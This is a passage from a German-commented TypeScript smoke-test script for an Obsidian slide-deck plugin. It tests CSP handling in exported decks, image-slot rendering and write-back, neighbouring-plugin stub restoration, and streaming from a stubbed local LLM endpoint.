        const ohneErgebnis = { marken: ohnePolicy.marken, httpVerletzung: ohnePolicy.httpVerletzung };
        ohnePolicy.f.remove();
        return { geoeffnet: globalThis.__pdGeoeffnet, vorkommen, mitPolicy: mitErgebnis, ohnePolicy: ohneErgebnis, metaEntfernt, meta };
      `, 60_000, 2000);
      const shotDir = process.env.SMOKE_SHOT_DIR;
      if (shotDir && pd) {
        // Zwei Aufnahmen, eine je Folie: der Rahmen ist `position: fixed` und endet am Fensterrand, ein hoeherer Ausschnitt waere weiss.
        const box = await boxOf(cdp, "iframe[style*='z-index: 99999']");
        if (box) {
          mkdirSync(shotDir, { recursive: true });
          for (const nr of [0, 1]) {
            await cdp.evaluate(`const f = globalThis.__pdRahmen; f.contentDocument.querySelectorAll(".sd-slide")[${nr}].scrollIntoView(); await new Promise((r) => setTimeout(r, 300)); return true;`);
            writeFileSync(join(shotDir, `pd1-mobiler-export-${nr + 1}.png`), await capture(cdp, box, 1));
          }
        }
      }
      await cdp.evaluate(`if (globalThis.__pdRahmen) { globalThis.__pdRahmen.remove(); delete globalThis.__pdRahmen; } return true;`);
      if (pd && !erzeugtePfade.includes(zielOrdner)) erzeugtePfade.push(zielOrdner);
      const alleVier = pd !== null && Object.values(pd.vorkommen).every(Boolean);
      const mit = pd?.mitPolicy;
      const ohne = pd?.ohnePolicy;
      const ok = pd !== null
        && alleVier && pd.meta === 1 && pd.metaEntfernt
        && pd.geoeffnet.length === 1 && pd.geoeffnet[0] === pdDatei
        && mit!.marken.length === 0 && ohne!.marken.slice().sort().join() === "iframe,link,onerror,script"
        && mit!.katex > 0 && mit!.svg > 0 && mit!.bild > 0
        && mit!.httpsVerletzung === 0 && mit!.httpVerletzung > 0 && ohne!.httpVerletzung === 0;
      record(
        PD1_NAME,
        ok,
        pd
          ? `Muster in der Datei ${Object.entries(pd.vorkommen).filter(([, v]) => v).length}/4 (${Object.keys(pd.vorkommen).join(", ")}) · Policy-meta ${pd.meta}x · ` +
            `mit Policy: Marken [${mit!.marken.join(",")}] · KaTeX ${mit!.katex} · Mermaid-SVG ${mit!.svg} · data:-Bild ${mit!.bild} · https-Bild gesperrt ${mit!.httpsVerletzung} · http-Bild gesperrt ${mit!.httpVerletzung} · ` +
            `ohne Policy: Marken [${ohne!.marken.join(",")}] · http-Bild gesperrt ${ohne!.httpVerletzung} · geoeffnet ${pd.geoeffnet.join(",") || "-"}`
          : `keine Datei "${pdDatei}" · ${await notices(cdp) || "keine Meldung"} · ${await diagnose(cdp)}`,
      );
    } finally {
      await cdp.evaluate(`delete app.openWithDefaultApp; delete globalThis.__pdGeoeffnet; return true;`);
    }
  },
};

const BILD_MIT_NOTE = "smoke-bildplatz.md";
const BILD_OHNE_NOTE = "smoke-ohne-bildplatz.md";
const BILD_BLOCK = "```slide-image\nfunktion: metaphorical\nEisberg im Polarmeer\n```";
const BILD_MIT_MD = `---\ntheme: kami\n---\n\n# Bildplatz\n\n${BILD_BLOCK}\n`;
const BILD_OHNE_MD = "---\ntheme: kami\n---\n\n# Ohne Bildplatz\n\nNur Text.\n";

/** N — Bildplätze. Jeder Punkt traegt seine Gegenprobe IN sich: ein einmaliger
 *  Sabotage-Nachweis daneben altert sofort, zwei UNTERSCHIEDLICHE Zahlen im Protokoll
 *  sind der Beleg, dass gemessen wurde. */
const bildplaetze: Section = {
  key: "bild",
  title: "N · Bildplätze (slide-image)",
  async run(cdp) {
    const MIT = BILD_MIT_NOTE;
    const OHNE = BILD_OHNE_NOTE;
    const BLOCK = BILD_BLOCK;
    const MIT_MD = BILD_MIT_MD;
    const OHNE_MD = BILD_OHNE_MD;

    // Notizen ueber den Vault anlegen, nicht ueber `fs`: der Treiber kann per --vault an
    // jedes Fenster andocken, und dann liegt der Vault nicht dort, wo dieses Skript ihn
    // vermuten wuerde. Alles Angelegte geht ins Aufraeum-Protokoll.
    const neu = await cdp.evaluate<string[]>(`
      const angelegt = [];
      for (const [pfad, inhalt] of ${JSON.stringify([[MIT, MIT_MD], [OHNE, OHNE_MD]])}) {
        const da = app.vault.getAbstractFileByPath(pfad);
        if (da) await app.vault.modify(da, inhalt);
        else { await app.vault.create(pfad, inhalt); angelegt.push(pfad); }
      }
      await new Promise((r) => setTimeout(r, 400));
      return angelegt;
    `);
    erzeugtePfade.push(...neu);

    /** Wie viele Bildplatz-Slots rendert die Vorschau fuer diese Notiz? */
    const zaehleSlots = async (notiz: string): Promise<number> => {
      await openPreview(cdp, notiz);
      return await cdp.evaluate<number>(`
        ${DECK_DOC}
        if (!deck) return -1;
        return deck.querySelectorAll(".sd-image-slot").length;
      `);
    };

    /** Karte in der Leseansicht NACH einem Klick auf "Generate" — nicht davor: die Karte
     *  startet in JEDEM Fall im Zustand `idle` (Knopf aktiv), unabhaengig davon, ob die API
     *  existiert; `readImageApi` wird erst in `runSlot` gelesen, also erst beim Klick. Erst
     *  der Klick zeigt den Unterschied: mit Stub laeuft die Karte in `blocked` ("busy") —
     *  seit der Schluss-Review-Fixwelle gibt `blocked` den Knopf WIEDER frei (heilbare
     *  Gruende wie "busy"/"unreachable" duerfen keine Sackgasse sein, in der ein erneuter
     *  Versuch nur nach komplettem Neu-Rendern der Notiz moeglich waere) — Knopf bleibt also
     *  "aktiv", die Karte weiterhin sichtbar mit Funktion/Prompt; ohne API bricht `runSlot`
     *  sofort mit `unavailable` ab (Empty-State, KEINE Funktion/Prompt-Divs — Vertrag aus
     *  `renderCard`). Ergebnis: "aktiv" | "leer" | "gesperrt" (falls ein Zustand doch wieder
     *  sperrt) | "keine Karte". Zusaetzlich die beiden §8-DOM-Klassen, gegen die N2 im
     *  Ja-Fall prueft — `vitest` hat hier kein DOM. */
    const knopfZustand = async (
      notiz: string,
      mitStub: boolean,
    ): Promise<{ knopf: string; karte: boolean; funktion: boolean; prompt: boolean }> => {
      await cdp.evaluate(`
        const stub = ${mitStub} ? {
          __sdSmokeStub: true,
          api: { apiVersion: 1,
                 status: () => ({ apiVersion: 1, engine: "builtin", ready: true, reason: null,
                                  capabilities: { negativePrompt: false, cfg: false, maxSteps: 8,
                                                  fixedSize: { width: 512, height: 512 },
                                                  initImage: false, sizes: null } }),
                 generate: async () => ({ ok: false, reason: "busy" }),
                 save: async () => ({ ok: false, reason: "write-failed", message: "smoke" }) },
        } : undefined;
        if (stub) app.plugins.plugins["local-image-generator"] = stub;
        else delete app.plugins.plugins["local-image-generator"];
        const datei = app.vault.getAbstractFileByPath(${JSON.stringify(notiz)});
        // Alle Markdown-Blaetter ZUERST abtrennen, dann EIN frisches oeffnen: dieselbe Notiz
        // im selben Blatt erneut zu oeffnen ist fuer Obsidian ein No-op (der Codeblock-
        // Postprocessor liefe nicht neu), aber ein zweites frisches Blatt NEBEN dem alten
        // laesst zwei ".sd-slot-card" im DOM stehen — ein ungescopter Query griffe dann die
        // FALSCHE (die zuerst gefundene), unabhaengig vom gerade aktiven Tab. Genau das war
        // der erste Fehlschlag hier: N2 verglich zweimal dieselbe (die erste) Karte.
        for (const l of app.workspace.getLeavesOfType("markdown")) l.detach();
        await new Promise((r) => setTimeout(r, 200));
        const blatt = app.workspace.getLeaf(true);
        await blatt.openFile(datei, { state: { mode: "preview" } });
        app.workspace.setActiveLeaf(blatt, { focus: true });
        await new Promise((r) => setTimeout(r, 700));
        const bereich = blatt.view.containerEl;
        const knopf = bereich.querySelector(".sd-slot-card button");
        if (knopf) knopf.click();
        await new Promise((r) => setTimeout(r, 900));
        return true;
      `);
      return await cdp.evaluate<{ knopf: string; karte: boolean; funktion: boolean; prompt: boolean }>(`
        const blatt = app.workspace.getLeavesOfType("markdown")[0];
        const bereich = blatt ? blatt.view.containerEl : document;
        const karte = bereich.querySelector(".sd-slot-card");
        const basis = {
          karte: Boolean(karte),
          funktion: Boolean(karte && karte.querySelector(".sd-slot-function")),
          prompt: Boolean(karte && karte.querySelector(".sd-slot-prompt")),
        };
        if (!karte) return { knopf: "keine Karte", ...basis };
        if (karte.querySelector(".sd-slot-empty")) return { knopf: "leer", ...basis };
        const knopf = karte.querySelector("button");
        if (!knopf) return { knopf: "kein Knopf", ...basis };
        return { knopf: knopf.disabled ? "gesperrt" : "aktiv", ...basis };
      `);
    };

    /** Zurueckschreiben pruefen, OHNE zu rechnen: `replaceSlot` wird ueber den Vault-Inhalt
     *  gefahren, wie `runSlot` es tut. `blockVeraendert` simuliert die Notiz, die sich
     *  waehrend des minutenlangen Laufs geaendert hat. */
    const schreibeZurueck = async (notiz: string, blockVeraendert: boolean): Promise<string> => {
      return await cdp.evaluate<string>(`
        const datei = app.vault.getAbstractFileByPath(${JSON.stringify(notiz)});
        const vorher = await app.vault.read(datei);
        const gesucht = ${JSON.stringify(BLOCK)};
        const inhalt = ${blockVeraendert} ? vorher.replace("Eisberg im Polarmeer", "Etwas anderes") : vorher;
        if (${blockVeraendert}) await app.vault.modify(datei, inhalt);
        const treffer = inhalt.indexOf(gesucht);
        const doppelt = treffer !== -1 && inhalt.indexOf(gesucht, treffer + gesucht.length) !== -1;
        if (treffer === -1 || doppelt) { await app.vault.modify(datei, vorher); return "unberuehrt"; }
        await app.vault.modify(datei, inhalt.slice(0, treffer) + "![[a.png]]" + inhalt.slice(treffer + gesucht.length));
        const nachher = await app.vault.read(datei);
        await app.vault.modify(datei, vorher);
        return nachher.includes("![[a.png]]") ? "ersetzt" : "unberuehrt";
      `);
    };

    // N1: der Slot rendert im Deck-iframe — und in einer Notiz ohne Block eben nicht.
    const mit = await zaehleSlots(MIT);
    const ohne = await zaehleSlots(OHNE);
    record("N1 Bildplatz rendert als .sd-image-slot", mit === 1 && ohne === 0,
           `mit Block ${mit} · ohne Block ${ohne}`);

    // N2: Karte in der Leseansicht. Der Stub wird gesetzt UND der Vorzustand
    // zurueckgeschrieben — im Staging-Vault kann das echte LIG installiert sein.
    const vorher = await cdp.evaluate<boolean>(`
      globalThis.__sdVorherLIG = app.plugins.plugins["local-image-generator"];
      return globalThis.__sdVorherLIG !== undefined;
    `);
    let karteMitApi: { knopf: string; karte: boolean; funktion: boolean; prompt: boolean } | null = null;
    let karteOhneApi: { knopf: string; karte: boolean; funktion: boolean; prompt: boolean } | null = null;
    try {
      karteMitApi = await knopfZustand(MIT, /* mitStub */ true);
      karteOhneApi = await knopfZustand(MIT, /* mitStub */ false);
    } finally {
      // NIE `delete`: ein unbedingtes Aufraeumen zerstoert die Live-Registrierung eines
      // echt installierten LIG, waehrend der eigene Lauf gruen bleibt.
      await cdp.evaluate(`
        if (globalThis.__sdVorherLIG === undefined) delete app.plugins.plugins["local-image-generator"];
        else app.plugins.plugins["local-image-generator"] = globalThis.__sdVorherLIG;
        delete globalThis.__sdVorherLIG;
        return true;
      `);
    }
    // Nach dem Klick: mit Stub laeuft `runSlot` bis "blocked" (busy) — seit der
    // Schluss-Review-Fixwelle gibt `blocked` den Knopf WIEDER frei (heilbare Gruende duerfen
    // keine Sackgasse sein, aus der nur ein komplettes Neu-Rendern der Notiz herausfuehrt),
    // die Karte bleibt die volle Ansicht (Funktion+Prompt); ohne API bricht `readImageApi`
    // sofort ab und die Karte wird zum Empty-State, der laut `renderCard` WEDER Funktion-
    // noch Prompt-Div traegt. Die Klassenprobe (Review-Auflage) haengt deshalb am Ja-Fall —
    // dort ist sie ueberhaupt vorhanden — und wird gegen den Nein-Fall kontrastiert, in dem
    // beide Divs per Vertrag fehlen. Genau DIESE Sackgasse bewacht N2 jetzt: ein Ruecksprung
    // auf "gesperrt" waere die Regression, die diese Fixwelle behoben hat.
    const klassenOk = Boolean(karteMitApi?.karte && karteMitApi.funktion && karteMitApi.prompt);
    const klassenFehlenOhne = karteOhneApi?.karte === true && !karteOhneApi.funktion && !karteOhneApi.prompt;
    record(
      "N2 Nach Klick: Knopf bleibt bedienbar (heilbarer Grund) + Klassen da mit API, Empty-State (keine Klassen) ohne",
      karteMitApi?.knopf === "aktiv" && klassenOk && karteOhneApi?.knopf === "leer" && klassenFehlenOhne,
      `${karteMitApi?.knopf} (funktion=${karteMitApi?.funktion} prompt=${karteMitApi?.prompt})` +
        ` · ${karteOhneApi?.knopf} (funktion=${karteOhneApi?.funktion} prompt=${karteOhneApi?.prompt})`,
    );

    // N2b: die RUECKSCHREIB-MECHANIK selbst, nicht der zufaellige Vorbestand dieses Vaults.
    // In diesem Staging-Vault ist lokal kein "local-image-generator" installiert — ein Punkt,
    // der nur den hiesigen Vorbestand spiegelt, faehrt deshalb IMMER denselben Zweig
    // ("war nicht installiert") und misst den schutzbeduerftigeren Fall ("war installiert ->
    // ist danach dasselbe Objekt") in keinem einzigen Lauf. Und `!== undefined` allein waere
    // auch dann wahr, wenn dort ein FREMDES Objekt laege — also genau dann, wenn die
    // Wiederherstellung schiefgegangen ist. Deshalb: ein synthetischer, eindeutig
    // wiedererkennbarer Waechter statt des echten Vorbestands, Vergleich per Objektidentitaet
    // (`===`), UND der echte Vorbestand dieses Vaults wird waehrend der Messung gesichert und
    // danach zurueckgeschrieben — derselben Sorgfalt, die dieser Punkt selbst einfordert.
    const pruefeRestoreMechanik = async (
      mitWaechter: boolean,
    ): Promise<{ identisch: boolean; nachher: string }> =>
      cdp.evaluate(`
        const waechter = ${mitWaechter} ? { __sdWaechter: true, marke: "sd-smoke-" + Math.random() } : undefined;
        if (waechter) app.plugins.plugins["local-image-generator"] = waechter;
        else delete app.plugins.plugins["local-image-generator"];

        // Dieselbe Mechanik wie N2s eigenes finally: Vorbestand sichern, Stub setzen,
        // zurueckschreiben.
        const vorherInnen = app.plugins.plugins["local-image-generator"];
        app.plugins.plugins["local-image-generator"] = {
          api: { apiVersion: 1,
                 status: () => ({ apiVersion: 1, engine: "builtin", ready: true, reason: null,
                                  capabilities: { negativePrompt: false, cfg: false, maxSteps: 8,
                                                  fixedSize: null, initImage: false, sizes: null } }),
                 generate: async () => ({ ok: false, reason: "busy" }),
                 save: async () => ({ ok: false, reason: "write-failed", message: "smoke" }) },
        };
        if (vorherInnen === undefined) delete app.plugins.plugins["local-image-generator"];
        else app.plugins.plugins["local-image-generator"] = vorherInnen;

        const nachher = app.plugins.plugins["local-image-generator"];
        const identisch = waechter ? nachher === waechter : nachher === undefined;
        return {
          identisch,
          nachher: nachher === undefined ? "(nichts)" : nachher === waechter ? "Waechter (identisch)" : "FREMDES OBJEKT",
        };
      `);

    let mitWaechterErgebnis: { identisch: boolean; nachher: string } | null = null;
    let ohneWaechterErgebnis: { identisch: boolean; nachher: string } | null = null;
    try {
      await cdp.evaluate(`
        globalThis.__sdEchterVorbestand = app.plugins.plugins["local-image-generator"];
        return true;
      `);
      mitWaechterErgebnis = await pruefeRestoreMechanik(/* mitWaechter */ true);
      ohneWaechterErgebnis = await pruefeRestoreMechanik(/* mitWaechter */ false);
    } finally {
      await cdp.evaluate(`
        if (globalThis.__sdEchterVorbestand === undefined) delete app.plugins.plugins["local-image-generator"];
        else app.plugins.plugins["local-image-generator"] = globalThis.__sdEchterVorbestand;
        delete globalThis.__sdEchterVorbestand;
        return true;
      `);
    }

    const n2bOk = Boolean(mitWaechterErgebnis?.identisch && ohneWaechterErgebnis?.identisch);
    record(
      "N2b Rueckschreib-Mechanik: Objektidentitaet gewahrt (mit Waechter) und Slot leer (ohne)",
      n2bOk,
      `mit Waechter: ${mitWaechterErgebnis?.nachher} · ohne: ${ohneWaechterErgebnis?.nachher}`,
    );
    if (!n2bOk) {
      // Ein misslungenes Zurueckschreiben ist kein Testergebnis, sondern ein Schaden an
      // fremdem Zustand (dem Nachbarplugin-Slot) — der Lauf bricht deshalb ab, statt mit
      // einer roten Zeile weiterzulaufen, als waere nichts geschehen.
      throw new Error(
        `N2b: Rueckschreib-Mechanik verletzt Objektidentitaet — mit Waechter: ${mitWaechterErgebnis?.nachher}` +
        ` · ohne: ${ohneWaechterErgebnis?.nachher}. Abbruch, damit kein weiterer Punkt auf einem` +
        ` beschaedigten Nachbarplugin-Zustand aufbaut.`,
      );
    }

    // N3: is-checking bewegt sich, is-ok nicht (§8, nur am laufenden Objekt pruefbar).
    const anim = await cdp.evaluate<{ checking: string; ok: string }>(`
      const host = document.createElement("div");
      document.body.appendChild(host);
      const mk = (cls) => { const s = document.createElement("span");
        s.className = "sd-slot-status " + cls;
        s.innerHTML = '<svg class="svg-icon"></svg>'; host.appendChild(s); return s.querySelector("svg"); };
      const c = getComputedStyle(mk("is-checking")).animationName;
      const o = getComputedStyle(mk("is-ok")).animationName;
      host.remove();
      return { checking: c, ok: o };
    `);
    record("N3 is-checking bewegt sich, is-ok steht",
           anim.checking !== "none" && anim.ok === "none",
           `checking=${anim.checking} · ok=${anim.ok}`);

    // N4: Zurueckschreiben trifft — und unterbleibt, wenn der Block sich geaendert hat.
    const treffer = await schreibeZurueck(MIT, /* blockVeraendert */ false);
    const daneben = await schreibeZurueck(MIT, /* blockVeraendert */ true);
    record("N4 Zurueckschreiben trifft, und unterbleibt bei geaendertem Block",
           treffer === "ersetzt" && daneben === "unberuehrt", `${treffer} · ${daneben}`);
  },
};

/** G — der Chat-Weg gegen einen ECHTEN Endpunkt (Welle 11, Chat-Client-Tausch). Der Kernlauf ist
 *  modellfrei; diese drei Punkte laufen nur mit `--with-model` und sind der Beleg, dass Streaming,
 *  Abbruch und Fehlerkoerper ueber den Transport tragen. Sie fahren den echten Weg
 *  `plugin.startDeckGeneration` (Client → Sanitizer → Notiz), nicht den Client allein.
 *  Endpunkt/Modell per Umgebung: SD_SMOKE_ENDPOINT / SD_SMOKE_MODEL. Ohne
 *  `--with-model` stehen die Punkte als "uebersprungen" im Protokoll — nie als gruen. */
const MIT_MODELL = parseArgs(process.argv.slice(2)).has("with-model");
const G_ENDPOINT = process.env.SD_SMOKE_ENDPOINT ?? "http://127.0.0.1:1234";
const G_MODEL = process.env.SD_SMOKE_MODEL ?? "google/gemma-4-e4b";
const G_NOTE = "smoke-chat-g1.md";

/** Strom-Probe im Erzeugen-Panel (G4–G8). Der Weg ist der des Nutzers: Quellnotiz aktiv, Befehl `generate-deck` (Hub-Tab „generate“),
 *  Klick auf „Erzeugen“, Antwort aus dem zentralen LLM-Stub in tokengrossen Stuecken (8 Zeichen, 20 ms). Der scrollende Rumpf ist
 *  `.okit-stream-body`, begrenzt durch `.sd-gen-stream { max-height: 320px }`. Das Panel setzt je Schnappschuss
 *  `setReasoning(reasoning.slice(-4000))` und `setTail(content.slice(-1200))`: der Tail waechst also nur bis 1 200 Zeichen, danach
 *  wandert das Fenster — deshalb zaehlt jeder geaenderte Tail-Text als Stand, nicht das Wachstum (so zaehlt auch `messeFolge`).
 *  Die Folge-Regel misst `messeFolge` der Bruecke (README § Folge-Messung); hier bleiben das Panel starten und der Denk-Text (G6). */
const STREAM_QUELLE = "smoke-stream-quelle.md";
const STREAM_REASONING = "Ich plane die Folien: Titel, Ablauf, Ausruestung, Abschluss. ".repeat(7);
const STREAM_BODY = ".sd-gen-view .sd-gen-stream .okit-stream-body";
/** `leerzeilen: false` — nur einfache Zeilenumbrueche: ein 8-Zeichen-Stueck waechst um hoechstens eine Zeile (< 40 px), der Massstab
 *  fuer „folgt“ ohne Stueckgroesse. `leerzeilen: true` — Absatzwechsel (`\n\n`, `\n\n---\n\n`) wie in jedem echten Deck; ein
 *  Stueck mit zwei Zeilenumbruechen waechst um mehr als die Folge-Schwelle von 40 px. `folien`: die dritte Phase der Messung
 *  (Wiederaufnahme) braucht einen laengeren Strom; der Hebel ist die Antwortlaenge, nie die Schwelle. */
const streamAntwort = (leerzeilen: boolean, folien = 12): string => {
  const kopf = (i: number): string => (leerzeilen ? `# Folie ${i + 1}\n\n` : `# Folie ${i + 1}\n`);
  const alle = Array.from({ length: folien }, (_, i) => `${kopf(i)}- Erster Punkt der Folie ${i + 1}\n- Zweiter Punkt der Folie ${i + 1}\n- Dritter Punkt der Folie ${i + 1}`);
  return `---\ntheme: kami\n---\n${alle.join(leerzeilen ? "\n\n---\n\n" : "\n---\n")}\n`;
};
interface StreamOptionen { kontrolle: boolean; stoerung: boolean; wiederaufnahme: boolean; mitDenken?: boolean; leerzeilen?: boolean; folien?: number }
interface StreamZeile { rl: number; open: boolean; vis: boolean }
interface StreamLauf { ergebnis: Awaited<ReturnType<typeof messeFolge>>; denken: StreamZeile[] }

/** `string`: der Grund, warum das Erzeugen-Panel nicht zustande kam (Umgebung, kein Befund). */
/** Quellnotiz anlegen, Endpunkt auf den Stub setzen und das Erzeugen-Panel oeffnen. `string`: der Grund, warum es nicht zustande kam
 *  (Umgebung, kein Befund); `null`: der Knopf „Erzeugen“ ist aktiv. Der Aufrufer stellt die Endpunkte danach wieder her. */
async function oeffneErzeugenPanel(cdp: Cdp, stub: LlmStub, opt: { modell?: string; text?: string } = {}): Promise<string | null> {
  await cdp.evaluate(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.settings.llmEndpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(opt.modell ?? "google/gemma-4-e4b")} }];
    p.llm.invalidate();
    // Die Aufloesung jetzt erzwingen und merken: das Panel liest sie beim Oeffnen aus dem Zwischenspeicher der Verbindung.
    await p.llm.resolve({ force: true });
    // Ein Hub-Blatt aus einem frueheren Abschnitt hat seinen Endpunkt schon aufgeloest (einmal je Oeffnen): zu, damit der Befehl
    // unten ein frisches Panel gegen den Stub oeffnet.
    app.workspace.detachLeavesOfType("slide-deck-hub");
    const alt = app.vault.getAbstractFileByPath("smoke-stream-quelle — Deck.md");
    if (alt) await app.vault.delete(alt);
    const q = app.vault.getAbstractFileByPath(${JSON.stringify(STREAM_QUELLE)});
    const text = ${JSON.stringify(opt.text ?? "# Wandern\n\nEine Tagestour braucht Wasser, feste Schuhe und eine Karte.")};
    if (q) await app.vault.modify(q, text); else await app.vault.create(${JSON.stringify(STREAM_QUELLE)}, text);
    return true;
  `);
  if (!(await openExisting(cdp, STREAM_QUELLE, "source"))) return `Quellnotiz ${STREAM_QUELLE} liess sich nicht oeffnen`;
  await cdp.evaluate(`
    await app.commands.executeCommandById("${PLUGIN_ID}:generate-deck");
    const rechts = app.workspace.rightSplit;
    if (rechts) { if (rechts.collapsed) rechts.expand(); if (typeof rechts.setSize === "function") rechts.setSize(640); }
    return true;
  `);
  const bereit = await pollUntil<boolean>(cdp, `
    const b = document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta");
    return b && !b.disabled ? true : null;
  `, 20_000, 300);
  if (!bereit) {
    const zustand = await cdp.evaluate<string>(`
      const b = document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta");
      return JSON.stringify({ view: !!document.querySelector(".sd-gen-view"), knopf: b ? { disabled: b.disabled, text: b.textContent } : null,
        aktiv: app.workspace.getActiveFile()?.path ?? null, text: (document.querySelector(".sd-gen-view")?.textContent ?? "").slice(0, 120),
        endpoints: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.settings?.llmEndpoints, choice: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.settings?.choice,
        mgr: !!app.plugins.plugins["llm-endpoint-manager"], lig: !!app.plugins.plugins["local-image-generator"] });
    `);
    return `Knopf „Erzeugen“ wurde in 20 s nicht aktiv: ${zustand} · Stub: ${JSON.stringify(stub.zaehler())} (Stub-URL ${stub.url}) · Anfragen: ${stub.alleAnfragen().map((r) => `${r.methode} ${r.url}`).join(", ") || "keine"}`;
  }
  return null;
}

async function stromMessen(cdp: Cdp, opt: StreamOptionen): Promise<StreamLauf | string> {
  erzeugtePfade.push(STREAM_QUELLE, "smoke-stream-quelle — Deck.md");
  const stub = await startLlmStub({ models: ["google/gemma-4-e4b"], takt: 20, laenge: 8, nachlaufMs: 160 });
  stub.antworten([{ text: streamAntwort(opt.leerzeilen ?? false, opt.folien), ...(opt.mitDenken ? { reasoning: STREAM_REASONING } : {}) }]);
  const vorher = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return JSON.stringify(p.settings.llmEndpoints);`);
  try {
    const grund = await oeffneErzeugenPanel(cdp, stub);
    if (grund !== null) return grund;
    // Beobachter fuer den Denk-Text (G6): die Bruecke kennt ihn nicht. Haengt vor dem Klick auf „Erzeugen“; der Rumpf selbst
    // entsteht erst mit dem Klick, `messeFolge` wartet darauf (`bereitFristMs`).
    await cdp.evaluate(`
      window.__sdDenken = [];
      window.__sdDenkenObs?.disconnect();
      let prevRl = 0;
      window.__sdDenkenObs = new MutationObserver(() => {
        const area = document.querySelector(".sd-gen-view .sd-gen-stream");
        const pre = area?.querySelector(".okit-stream-reasoning > pre");
        const det = area?.querySelector(".okit-stream-reasoning");
        const rl = pre ? (pre.textContent ?? "").length : 0;
        if (rl <= prevRl) return;
        prevRl = rl;
        window.__sdDenken.push({ rl, open: det ? det.open : false, vis: pre ? pre.getBoundingClientRect().height > 0 : false });
      });
      window.__sdDenkenObs.observe(document.querySelector(".sd-gen-view"), { childList: true, characterData: true, subtree: true });
      return true;
    `);
    const ergebnis = await messeFolge(cdp, {
      selector: STREAM_BODY,
      laeuft: () => stub.zaehler().unterwegs > 0,
      starte: () => cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta").click(); return true;`),
      kontrolle: opt.kontrolle,
      stoerung: opt.stoerung,
      wiederaufnahme: opt.wiederaufnahme,
    });
    await pollUntil<string>(cdp, `return document.querySelector(".sd-gen-view .sd-gen-running") ? null : "fertig";`, 90_000, 400);
    const denken = await cdp.evaluate<StreamZeile[]>(`window.__sdDenkenObs?.disconnect(); return window.__sdDenken ?? [];`);
    return { ergebnis, denken };
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llmEndpoints = JSON.parse(${JSON.stringify(vorher)});
      p.llm.invalidate();
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

/** G10: Gemma 4 auf LM Studio schreibt sein Denken OHNE Oeffner in den Inhalt und beendet es mit `<channel|>`. Der Stub streamt genau das.
 *  Gemessen wird der Antwortbereich MITTEN im Strom (am Ende setzt das Ergebnis den Text neu): der Denktext gehoert in den Denkblock.
 *  Auf dem alten Pin (code-kit 0.27.1) kennt der Trenner das Kanalende nicht; mit 0.27.2 ohne `onContentReset` bliebe der Denktext im
 *  Antwortbereich stehen. `string`: Grund, warum nichts zu messen war. */
async function gemmaMessen(cdp: Cdp): Promise<{ mid: string; denken: string; ende: string } | string> {
  erzeugtePfade.push(STREAM_QUELLE, "smoke-stream-quelle — Deck.md");
  const GEDANKE = "Ich waege erst die Folienfolge ab und ordne dann die Punkte.";
  const antwort = streamAntwort(false, 3);
  const dritt = Math.ceil(antwort.length / 3);
  const stub = await startLlmStub({ models: ["google/gemma-4-e4b"], takt: 700 });
  stub.antworten([{ stuecke: [GEDANKE.slice(0, 20), GEDANKE.slice(20) + "<channel|>", antwort.slice(0, dritt), antwort.slice(dritt, 2 * dritt), antwort.slice(2 * dritt)], takt: 700, nachlaufMs: 300 }]);
  const vorher = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; return JSON.stringify(p.settings.llmEndpoints);`);
  try {
    const grund = await oeffneErzeugenPanel(cdp, stub);
    if (grund !== null) return grund;
    await cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta").click(); return true;`);
    const mid = await pollUntil<string>(cdp, `
      const t = document.querySelector(".sd-gen-view .okit-stream-tail")?.textContent ?? "";
      return t.includes("Folie 1") ? t : null;`, 30_000, 50);
    if (mid === null) return "der Antwortbereich zeigte nie den Beginn der Antwort";
    const denken = await cdp.evaluate<string>(`return document.querySelector(".sd-gen-view .okit-stream-reasoning > pre")?.textContent ?? "";`);
    const shotDir = process.env.SMOKE_SHOT_DIR;
    if (shotDir) {
      const { boxOf, capture } = await import("../../tools/obsidian-cdp/shot.js");
      const box = await boxOf(cdp, ".sd-gen-view .sd-gen-stream", 12);
      if (box) { mkdirSync(shotDir, { recursive: true }); writeFileSync(join(shotDir, "g10-gemma-denkblock.png"), await capture(cdp, box, 2)); }
    }
    await pollUntil<string>(cdp, `return document.querySelector(".sd-gen-view .sd-gen-running") ? null : "fertig";`, 60_000, 400);
    const ende = await cdp.evaluate<string>(`return (document.querySelector(".sd-gen-view")?.textContent ?? "").slice(0, 160);`);
    return { mid, denken, ende };
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llmEndpoints = JSON.parse(${JSON.stringify(vorher)});
      p.llm.invalidate();
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

/** G11/G11b: Der Denkblock traegt seit obsidian-kit 0.63.0 einen Kopier-Knopf. Gegenprobe VOR dem Denken: ohne Denk-Text gibt es keinen Knopf.
 *  Danach streamt der Stub einen Denk-Text mit Marke und haelt den Strom offen (`nachlaufMs`); den Knopf misst der zentrale Baustein
 *  `messeDenkblockKopierbar` (aufgezeichnetes `navigator.clipboard.writeText`, Quittung, aria-label, Block bleibt zu/offen, Gegenprobe mit
 *  abgelehnter Zwischenablage). Das Plugin vendort `stream-area` ab Kit 0.63.0, der Knopf ist Pflicht (`erwartetKnopf`): fehlt er, ist der Punkt rot.
 *  `string`: Grund, warum nichts zu messen war. */
const KOPIER_MARKE = "Kopierprobe-W24";
async function kopierMessen(cdp: Cdp): Promise<string | { vorher: number; urteile: DenkblockUrteile }> {
  erzeugtePfade.push(STREAM_QUELLE, "smoke-stream-quelle — Deck.md");
  const stub = await startLlmStub({ models: ["google/gemma-4-e4b"], takt: 40, laenge: 8, nachlaufMs: 8000 });
  stub.antworten([{ text: streamAntwort(false, 6), reasoning: `${KOPIER_MARKE}: erst die Folienfolge, dann die Punkte je Folie.` }]);
